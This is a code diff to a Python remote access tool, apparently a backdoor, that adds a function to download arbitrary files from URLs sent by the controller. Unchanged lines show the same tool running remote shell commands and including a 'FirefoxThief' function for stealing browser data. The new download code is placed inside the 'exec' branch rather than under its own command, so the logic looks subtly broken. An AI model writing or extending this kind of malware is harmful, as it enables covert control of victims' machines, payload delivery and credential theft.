@@ -158,6 +158,12 @@ def FirefoxThief():
     else:
         SendData("Error: not Linux, not supported!")
 
+def DownHTTP(url,fileName):
+    fileHTTP = urllib.URLopener()
+    if fileName == "":
+        fileHTTP.retrieve(url,url.split("/")[len(url.split("/"))-1])
+    else:
+        fileHTTP.retrieve(url,fileName)
 
 def DKey(primitiveKey, salt):
     dk = hashlib.pbkdf2_hmac('sha256', primitiveKey, salt, 500000)
@@ -360,6 +366,17 @@ while 1:
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
+        try:
+            if len(inText.split(":")) == 3:
+                DownHTTP(inText.split(":")[1],inText.split(":")[2])
+                SendData("Download complete!")
+            elif len(inText.split(":")) == 2:
+                DownHTTP(inText.split(":")[1],"")
+                SendData("Download complete!")
+            else:
+                SendData("Error! \n usage: downhttp:url:save.type")
+        except IOError as err:
+            SendData("Error "+err)
     elif inText == "FirefoxThief":
         FirefoxThief()
     else:
